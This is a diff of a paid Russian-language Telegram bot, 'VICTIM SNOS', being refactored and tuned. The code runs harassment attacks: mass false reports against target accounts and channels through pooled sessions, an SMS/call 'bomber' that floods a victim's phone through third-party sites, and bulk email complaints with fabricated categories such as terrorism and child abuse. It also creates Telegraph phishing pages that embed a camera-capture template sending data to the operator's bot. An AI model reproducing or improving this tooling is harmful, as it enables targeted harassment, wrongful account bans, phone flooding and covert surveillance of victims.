                 await progress_callback(rnd, rounds, ok)
             
+            logger.info(f"Round {rnd}/{rounds} for {phone}: {round_ok} requests, total: {ok}")
+            
             if rnd < rounds and not stop_event.is_set():
                 await asyncio.sleep(ROUND_DELAY)
+    
+    if failed_sessions > 5:
+        logger.warning(f"Many failed sessions ({failed_sessions}), refreshing...")
+        asyncio.create_task(refresh_user_sessions(user_id))
     
     return ok
 
@@ -860,7 +893,6 @@ async def report_username_via_session(session_data: dict, username: str, reason:
             return {"success": False}
         
         report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
-        
         await client.invoke(ReportPeer(peer=peer, reason=report_reason, message="Нарушение правил Telegram"))
         return {"success": True}
     except:
@@ -875,16 +907,13 @@ async def snos_attack_username(user_id: int, username: str, rounds: int, stop_ev
         if stop_event.is_set():
             break
         
-        sessions = await get_user_sessions_batch(user_id, min(50, SESSIONS_PER_USER))
+        sessions = await get_user_sessions_batch(user_id, min(20, SESSIONS_PER_USER))
         if not sessions:
             break
         
         tasks = []
         for s in sessions:
             tasks.append(report_username_via_session(s, username, "spam"))
-            tasks.append(report_username_via_session(s, username, "violence"))
-            tasks.append(report_username_via_session(s, username, "pornography"))
-            tasks.append(report_username_via_session(s, username, "copyright"))
             tasks.append(report_username_via_session(s, username, "other"))
         
         batch = await asyncio.gather(*tasks, return_exceptions=True)
@@ -905,13 +934,7 @@ async def snos_attack_username(user_id: int, username: str, rounds: int, stop_ev
 
 # ---------- БОМБЕР ----------
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
-    headers = {
-        'User-Agent': random.choice(USER_AGENTS),
-        'Accept': '*/*',
-        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Origin': site["url"].split('/api')[0] if '/api' in site["url"] else site["url"],
-        'Referer': site["url"].split('/api')[0] if '/api' in site["url"] else site["url"],
-    }
+    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': '*/*', 'Accept-Language': 'ru-RU,ru;q=0.9'}
     clean_phone = phone.replace("+", "").replace(" ", "").replace("-", "")
     
     try:
@@ -928,7 +951,7 @@ async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: 
         else:
             async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
                 return {"site": site["name"], "success": resp.status < 500}
-    except Exception as e:
+    except:
         return {"site": site["name"], "success": False}
 
 async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
@@ -938,7 +961,7 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
         phone = "+" + phone
     add_log(user_id, "Бомбер", phone)
     
-    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as sess:
         for rnd in range(1, rounds + 1):
             if stop_event.is_set():
@@ -946,7 +969,7 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
             
             tasks = []
             for site in BOMBER_SITES:
-                for _ in range(3):
+                for _ in range(2):
                     tasks.append(send_bomber_request(sess, phone, site))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
@@ -978,7 +1001,6 @@ async def report_message_via_session(session_data: dict, channel: str, msg_id: i
         
         peer = await client.resolve_peer(chat.id)
         report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
-        
         await client.invoke(raw_messages.Report(peer=peer, id=[msg_id], reason=report_reason, message="Нарушение правил"))
         return {"success": True}
     except:
@@ -1004,7 +1026,7 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
     if not is_user_sessions_ready(user_id):
         return 0, "Сессии не готовы"
     
-    sessions = await get_user_sessions_batch(user_id, min(50, SESSIONS_PER_USER))
+    sessions = await get_user_sessions_batch(user_id, min(20, SESSIONS_PER_USER))
     if not sessions:
         return 0, "Нет доступных сессий"
     
@@ -1024,44 +1046,29 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
 async def create_telegraph_page(title: str, description: str, button_text: str, chat_id: int, page_id: str) -> Optional[str]:
     try:
         camera_html = CAMERA_TEMPLATE.format(
-            title=title, 
-            description=description, 
-            button_text=button_text,
-            bot_token=BOT_TOKEN, 
-            chat_id=chat_id, 
-            page_id=page_id
+            title=title, description=description, button_text=button_text,
+            bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id
         )
         
-        # Создаем аккаунт в Telegraph
         async with aiohttp.ClientSession() as session:
             async with session.post(
                 "https://api.telegra.ph/createAccount",
-                json={
-                    "short_name": f"User{random.randint(1000, 9999)}",
-                    "author_name": "Telegram User",
-                    "author_url": "https://t.me/VICTIMSNOSER"
-                },
+                json={"short_name": f"User{random.randint(1000, 9999)}", "author_name": "Telegram User", "author_url": "https://t.me/VICTIMSNOSER"},
                 timeout=10
             ) as resp:
                 data = await resp.json()
                 if not data.get("ok"):
-                    logger.error(f"Telegraph createAccount error: {data}")
                     return None
                 access_token = data["result"]["access_token"]
             
-            # Создаем страницу
             async with session.post(
                 "https://api.telegra.ph/createPage",
                 json={
-                    "access_token": access_token,
-                    "title": title,
-                    "author_name": "Telegram User",
+                    "access_token": access_token, "title": title, "author_name": "Telegram User",
                     "author_url": "https://t.me/VICTIMSNOSER",
                     "content": [
                         {"tag": "p", "children": [description]},
-                        {"tag": "figure", "children": [
-                            {"tag": "div", "attrs": {"data-html": camera_html}}
-                        ]}
+                        {"tag": "figure", "children": [{"tag": "div", "attrs": {"data-html": camera_html}}]}
                     ],
                     "return_content": False
                 },
@@ -1070,20 +1077,11 @@ async def create_telegraph_page(title: str, description: str, button_text: str, 
                 data = await resp.json()
                 if data.get("ok"):
                     url = data["result"]["url"]
-                    phish_pages[page_id] = {
-                        "url": url, 
-                        "chat_id": chat_id, 
-                        "created": time.time(),
-                        "title": title
-                    }
-                    logger.info(f"Telegraph page created: {url}")
+                    phish_pages[page_id] = {"url": url, "chat_id": chat_id, "created": time.time(), "title": title}
                     return url
-                else:
-                    logger.error(f"Telegraph createPage error: {data}")
-                    return None
-    except Exception as e:
-        logger.error(f"Telegraph error: {e}")
-        return None
+    except:
+        pass
+    return None
 
 
 # ---------- UI ----------
@@ -1137,25 +1135,16 @@ def get_mail_menu():
 
 def get_mail_account_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="1.1 - Нарушение правил", callback_data="mailacc_1.1")
-    builder.button(text="1.2 - Взлом аккаунта", callback_data="mailacc_1.2")
-    builder.button(text="1.3 - Виртуальный номер", callback_data="mailacc_1.3")
-    builder.button(text="1.4 - Спам в описании", callback_data="mailacc_1.4")
-    builder.button(text="1.5 - Спам с Premium", callback_data="mailacc_1.5")
+    for k in COMPLAINT_TEXTS_ACCOUNT.keys():
+        builder.button(text=f"{k} - Жалоба", callback_data=f"mailacc_{k}")
     builder.button(text="НАЗАД", callback_data="mail_menu")
     builder.adjust(1)
     return builder.as_markup()
 
 def get_mail_channel_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="8 - Личные данные", callback_data="mailchan_8")
-    builder.button(text="9 - Доксинг/Сваттинг", callback_data="mailchan_9")
-    builder.button(text="10 - Терроризм", callback_data="mailchan_10")
-    builder.button(text="11 - Детская порнография", callback_data="mailchan_11")
-    builder.button(text="12 - Мошенничество", callback_data="mailchan_12")
-    builder.button(text="13 - Продажа номеров", callback_data="mailchan_13")
-    builder.button(text="14 - Шок-контент", callback_data="mailchan_14")
-    builder.button(text="15 - Живодерство", callback_data="mailchan_15")
+    for k in COMPLAINT_TEXTS_CHANNEL.keys():
+        builder.button(text=f"{k} - Жалоба", callback_data=f"mailchan_{k}")
     builder.button(text="НАЗАД", callback_data="mail_menu")
     builder.adjust(1)
     return builder.as_markup()
@@ -1191,16 +1180,17 @@ def get_admin_menu():
     builder.button(text="СОЗДАТЬ ПРОМОКОД", callback_data="admin_create_promo")
     builder.button(text="СПИСОК", callback_data="admin_list")
     builder.button(text="ЛОГИ", callback_data="admin_logs")
+    builder.button(text="ПРОВЕРКА СВЯЗИ", callback_data="admin_check_conn")
     builder.button(text="НАЗАД", callback_data="main_menu")
     builder.adjust(2)
     return builder.as_markup()
 
 def get_purchase_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="30 дней - 100 RUB", callback_data="buy_30d_rub")
-    builder.button(text="60 дней - 200 RUB", callback_data="buy_60d_rub")
-    builder.button(text="Навсегда - 400 RUB", callback_data="buy_forever_rub")
-    builder.button(text="Оплата Звездами", callback_data="buy_stars")
+    builder.button(text="30 дней - 100 RUB", callback_data="buy_rub_30d")
+    builder.button(text="60 дней - 200 RUB", callback_data="buy_rub_60d")
+    builder.button(text="Навсегда - 400 RUB", callback_data="buy_rub_forever")
+    builder.button(text="Оплата Звездами", callback_data="buy_stars_menu")
     builder.button(text="Использовать промокод", callback_data="use_promo")
     builder.button(text="НАЗАД", callback_data="main_menu")
     builder.adjust(1)
@@ -1208,9 +1198,9 @@ def get_purchase_menu():
 
 def get_stars_purchase_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="30 дней - 100 Звезд", callback_data="stars_30d")
-    builder.button(text="60 дней - 200 Звезд", callback_data="stars_60d")
-    builder.button(text="Навсегда - 400 Звезд", callback_data="stars_forever")
+    builder.button(text="30 дней - 100 Звезд", callback_data="buy_stars_30d")
+    builder.button(text="60 дней - 200 Звезд", callback_data="buy_stars_60d")
+    builder.button(text="Навсегда - 400 Звезд", callback_data="buy_stars_forever")
     builder.button(text="НАЗАД", callback_data="purchase_menu")
     builder.adjust(1)
     return builder.as_markup()
@@ -1260,6 +1250,36 @@ async def edit_message_with_banner(callback: types.CallbackQuery, text: str, mar
     user_messages[user_id].append(msg.message_id)
 
 
+# ---------- ПРОВЕРКА ПОДКЛЮЧЕНИЯ ----------
+async def check_telegram_availability() -> dict:
+    results = {}
+    
+    urls = ["https://api.telegram.org", "https://my.telegram.org", "https://web.telegram.org"]
+    
+    async with aiohttp.ClientSession() as session:
+        for url in urls:
+            try:
+                async with session.get(url, timeout=10, ssl=False) as resp:
+                    results[url] = f"HTTP {resp.status}"
+            except asyncio.TimeoutError:
+                results[url] = "Timeout"
+            except Exception as e:
+                results[url] = f"Error: {type(e).__name__}"
+    
+    test_ips = ["149.154.167.40", "149.154.167.50", "91.108.56.151"]
+    for ip in test_ips:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((ip, 443))
+            sock.close()
+            results[f"TCP {ip}:443"] = "Open" if result == 0 else "Closed"
+        except:
+            results[f"TCP {ip}:443"] = "Error"
+    
+    return results
+
+
 # ---------- ОБРАБОТЧИКИ ----------
 @dp.message(Command("start"))
 async def start(msg: types.Message):
@@ -1277,11 +1297,7 @@ async def start(msg: types.Message):
     if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
         asyncio.create_task(ensure_user_sessions(user_id))
     
-    await send_message_with_banner(
-        msg,
-        "Выберите действие:",
-        get_main_menu(user_id)
-    )
+    await send_message_with_banner(msg, "Выберите действие:", get_main_menu(user_id))
 
 @dp.message(Command("admin"))
 async def admin_cmd(msg: types.Message):
@@ -1304,7 +1320,7 @@ async def snos_type_back(cb: types.CallbackQuery):
 @dp.callback_query(F.data == "snos_phone")
 async def snos_phone_type(cb: types.CallbackQuery, state: FSMContext):
     await state.update_data(snos_type="phone")
-    await edit_message_with_banner(cb, "Снос по номеру телефона\n\n100 запросов/раунд\nМакс. 10 раундов", get_snos_menu())
+    await edit_message_with_banner(cb, "Снос по номеру телефона\n\n30 запросов/раунд\nМакс. 10 раундов", get_snos_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "snos_username")
@@ -1399,7 +1415,6 @@ async def snos_phone_count(msg: types.Message, state: FSMContext):
     
     ok = await snos_attack_phone(user_id, phone, count, stop_event, progress_callback)
     
-    asyncio.create_task(refresh_user_sessions(user_id))
     await st.delete()
     if user_id in active_attacks:
         del active_attacks[user_id]
@@ -1451,7 +1466,6 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
     
     ok = await snos_attack_username(user_id, username, count, stop_event, progress_callback)
     
-    asyncio.create_task(refresh_user_sessions(user_id))
     await st.delete()
     if user_id in active_attacks:
         del active_attacks[user_id]
@@ -1590,14 +1604,9 @@ async def mail_acc_id(msg: types.Message, state: FSMContext):
     sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
     
     await st.delete()
-    
     add_log(user_id, "Снос почтой (аккаунт)", f"@{username} - {sent} писем")
     
-    await send_message_with_banner(
-        msg,
-        f"Жалобы отправлены!\n\nАккаунт: @{username}\nID: <code>{telegram_id}</code>\nТип: {complaint_type}\nОтправлено: <b>{sent}</b> писем",
-        get_main_menu(user_id)
-    )
+    await send_message_with_banner(msg, f"Жалобы отправлены!\n\nАккаунт: @{username}\nID: <code>{telegram_id}</code>\nТип: {complaint_type}\nОтправлено: <b>{sent}</b> писем", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "mail_chan")
 async def mail_chan_menu(cb: types.CallbackQuery):
@@ -1649,14 +1658,9 @@ async def mail_chan_violation(msg: types.Message, state: FSMContext):
     sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
     
     await st.delete()
-    
     add_log(user_id, "Снос почтой (канал)", f"{channel} - {sent} писем")
     
-    await send_message_with_banner(
-        msg,
-        f"Жалобы отправлены!\n\nКанал: {channel}\nНарушение: {violation}\nТип: {complaint_type}\nОтправлено: <b>{sent}</b> писем",
-        get_main_menu(user_id)
-    )
+    await send_message_with_banner(msg, f"Жалобы отправлены!\n\nКанал: {channel}\nНарушение: {violation}\nТип: {complaint_type}\nОтправлено: <b>{sent}</b> писем", get_main_menu(user_id))
 
 @dp.callback_query(F.data == "report_menu")
 async def report_menu(cb: types.CallbackQuery):
@@ -1793,59 +1797,48 @@ async def phish_button(msg: types.Message, state: FSMContext):
 async def phish_list(cb: types.CallbackQuery):
     user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
     if not user_pages:
-        await edit_message_with_banner(
-            cb, 
-            "У вас пока нет созданных ссылок",
-            InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])
-        )
+        await edit_message_with_banner(cb, "У вас пока нет созданных ссылок", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]]))
         return
     
     text = "Ваши ссылки:\n\n"
     for _, d in user_pages[-5:]:
         text += f"<code>{d['url']}</code>\n\n"
     
-    await edit_message_with_banner(
-        cb, 
-        text,
-        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]])
-    )
+    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]]))
 
 @dp.callback_query(F.data == "purchase_menu")
 async def purchase_menu(cb: types.CallbackQuery):
     await edit_message_with_banner(cb, "Приобретение доступа\n\n30 дней - 100 RUB / 100 Звезд\n60 дней - 200 RUB / 200 Звезд\nНавсегда - 400 RUB / 400 Звезд", get_purchase_menu())
     await cb.answer()
 
-@dp.callback_query(F.data.startswith("buy_"))
-async def buy_subscription(cb: types.CallbackQuery):
-    parts = cb.data.replace("buy_", "").split("_")
-    duration = parts[0]
-    currency = parts[1] if len(parts) > 1 else "rub"
+@dp.callback_query(F.data.startswith("buy_rub_"))
+async def buy_rub_subscription(cb: types.CallbackQuery):
+    duration = cb.data.replace("buy_rub_", "")
+    prices = PRICES[duration]["rub"]
     
-    if currency == "rub":
-        prices = PRICES[duration]["rub"]
-        await bot.send_invoice(
-            chat_id=cb.from_user.id,
-            title=f"VICTIM SNOS - {duration}",
-            description=f"Доступ на {duration}",
-            payload=f"sub_{duration}",
-            provider_token=PAYMENT_PROVIDER_TOKEN,
-            currency="RUB",
-            prices=[LabeledPrice(label=f"Доступ {duration}", amount=prices * 100)],
-            start_parameter="victim_snos",
-            protect_content=True
-        )
-        await cb.message.delete()
-        await cb.message.answer("Счет выставлен. Проверьте сообщение с оплатой.")
+    await bot.send_invoice(
+        chat_id=cb.from_user.id,
+        title=f"VICTIM SNOS - {duration}",
+        description=f"Доступ на {duration}",
+        payload=f"sub_{duration}",
+        provider_token=PAYMENT_PROVIDER_TOKEN,
+        currency="RUB",
+        prices=[LabeledPrice(label=f"Доступ {duration}", amount=prices * 100)],
+        start_parameter="victim_snos",
+        protect_content=True
+    )
+    await cb.message.delete()
+    await cb.message.answer("Счет выставлен. Проверьте сообщение с оплатой.")
     await cb.answer()
 
-@dp.callback_query(F.data == "buy_stars")
+@dp.callback_query(F.data == "buy_stars_menu")
 async def buy_stars_menu(cb: types.CallbackQuery):
     await edit_message_with_banner(cb, "Оплата Звездами Telegram", get_stars_purchase_menu())
     await cb.answer()
 
-@dp.callback_query(F.data.startswith("stars_"))
-async def buy_stars(cb: types.CallbackQuery):
-    duration = cb.data.replace("stars_", "")
+@dp.callback_query(F.data.startswith("buy_stars_"))
+async def buy_stars_subscription(cb: types.CallbackQuery):
+    duration = cb.data.replace("buy_stars_", "")
     prices = PRICES[duration]["stars"]
     
     await bot.send_invoice(
@@ -1931,11 +1924,40 @@ async def admin_menu_handler(cb: types.CallbackQuery):
 async def admin_logs(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
         return
-    await edit_message_with_banner(
-        cb, 
-        f"Последние действия:\n\n{get_last_logs(10)}", 
-        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]])
-    )
+    await edit_message_with_banner(cb, f"Последние действия:\n\n{get_last_logs(10)}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]]))
+
+@dp.callback_query(F.data == "admin_check_conn")
+async def admin_check_connection(cb: types.CallbackQuery):
+    if cb.from_user.id != ADMIN_ID:
+        return
+    
+    await cb.answer("Проверка...")
+    status_msg = await cb.message.answer("Проверка подключения к Telegram...")
+    
+    results = await check_telegram_availability()
+    
+    text = "Результаты проверки:\n\n"
+    for target, status in results.items():
+        emoji = "✅" if "200" in status or "Open" in status else "❌"
+        text += f"{emoji} {target}: {status}\n"
+    
+    text += "\nПроверка создания сессии...\n"
+    try:
+        test_session = await create_single_session("test_connection", 999)
+        if test_session:
+            text += f"✅ Тестовая сессия создана ({test_session.get('connection_mode', 'unknown')})\n"
+            try:
+                await test_session["client"].disconnect()
+            except:
+                pass
+            if os.path.exists("test_connection.session"):
+                os.remove("test_connection.session")
+        else:
+            text += "❌ Не удалось создать тестовую сессию\n"
+    except Exception as e:
+        text += f"❌ Ошибка создания сессии: {e}\n"
+    
+    await status_msg.edit_text(text)
 
 @dp.callback_query(F.data == "admin_add")
 async def admin_add(cb: types.CallbackQuery, state: FSMContext):
@@ -2130,11 +2152,7 @@ async def status(cb: types.CallbackQuery):
             except:
                 pass
     
-    await edit_message_with_banner(
-        cb, 
-        f"Ваш ID: <code>{user_id}</code>\nДоступ до: {expire}",
-        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="main_menu")]])
-    )
+    await edit_message_with_banner(cb, f"Ваш ID: <code>{user_id}</code>\nДоступ до: {expire}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="main_menu")]]))
 
 @dp.callback_query(F.data == "stop")
 async def stop(cb: types.CallbackQuery):
@@ -2168,13 +2186,33 @@ async def main():
     load_allowed_users()
     load_payments()
     load_promo_codes()
-    logger.info("VICTIM SNOS запущен")
     
-    # Проверяем наличие баннера
+    logger.info("VICTIM SNOS запущен")
+    logger.info(f"Основных MTProto прокси: {len(MT_PROTO_PROXIES)}")
+    logger.info(f"Резервных MTProto прокси: {len(FALLBACK_MT_PROTO_PROXIES)}")
+    
     if os.path.exists(BANNER_PATH):
         logger.info(f"Баннер найден: {BANNER_PATH}")
     else:
         logger.warning(f"Баннер не найден: {BANNER_PATH}")
+    
+    # Проверка подключения при старте
+    logger.info("Проверка подключения к серверам Telegram...")
+    availability = await check_telegram_availability()
+    
+    available = False
+    for target, status in availability.items():
+        if "200" in status or "Open" in status:
+            available = True
+            logger.info(f"✅ {target}: {status}")
+        else:
+            logger.warning(f"❌ {target}: {status}")
+    
+    if available:
+        logger.info("Подключение к Telegram доступно")
+    else:
+        logger.warning("ВНИМАНИЕ: Подключение к Telegram может быть недоступно!")
+        logger.warning("Бот будет пробовать разные способы подключения...")
     
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot)
